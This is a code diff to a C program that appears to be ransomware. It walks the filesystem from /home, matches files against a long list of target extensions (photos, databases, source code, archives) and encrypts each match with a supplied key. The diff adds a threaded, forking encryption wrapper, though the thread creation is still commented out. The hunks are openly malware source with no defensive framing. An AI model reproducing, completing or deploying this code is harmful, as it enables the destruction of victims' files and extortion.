@@ -10,14 +10,46 @@
 #include <sys/socket.h>
 #include <sys/types.h>
 #include <arpa/inet.h>
+#include <pthread.h>
 #include "lib/debug.h"
 #include "lib/key_pub.h"
 #include "lib/crypto.h"
 #include "lib/file_handling.h"
 
+typedef struct _file_data_t {
+    char * path;
+    char * filename;
+    char * key;
+} file_data_t;
+
+
+void * cryto_thread(void * pathfilekey) {
+    /*
+    
+    DO NOT USE!!!!
+
+    */
+    file_data_t * data = (file_data_t *) pathfilekey;
+    pid_t fc = fork();
+
+    if (fc < 0) {
+        dbgerr("Error while forking in crypto_thread");
+    } else if (fc == 0) {
+            cifrar(
+                data->path, 
+                data->filename, 
+                data->key
+            );
+    } else {
+        int ro = waitpid(fc, NULL, 0);
+        /* nothing here yet */
+        pthread_exit(NULL);
+    }
+}
+
 
 char path[131072]="/home";
-char extension[][10] = {
+char extension[][8] = {
     ".jpg",".jpeg",".raw",".tif",".gif",".png",".bmp",".3dm",
     ".max",".accdb",".db",".dbf",".mdb",".pdb",".sql",".dwg",
     ".dxf",".c",".cpp",".cs",".h",".php",".asp",".rb",".java",
@@ -35,6 +67,7 @@ char extension[][10] = {
     ".mkv",".dat",".csv",".efx",".sdf",".vcf",".xml",".ses",".rar",
     ".zip",".7zip"
 }; /* agregar como lista de extensiones */
+
 int ext_len = sizeof(extension)/(sizeof(char)*10);
 
 int find_ext(char file[]){
@@ -73,6 +106,9 @@ int list_files(int n, int h, char key[])
                 }else if(dir->d_type == DT_REG){
                     if(find_ext(dir->d_name)){
                         //printf("%s/%s -> Filesito\n", path,dir->d_name);
+                        file_data_t t_arg = { path, dir->d_name, key };
+                        pthread_t t;
+                        //pthread_create(&t, NULL, cryto_thread, (void *)&t_arg);
                         cifrar(path, dir->d_name, key);
                     }
                 }
@@ -85,7 +121,7 @@ int list_files(int n, int h, char key[])
 
 void main(int argc, char * argv[]){
     if(argc != 3){
-        fprintf(stderr,"No po, pa la 11\n");
+        fprintf(stderr,"No po weon, pa la 11\n");
         exit(69);
     }
     //Create flag
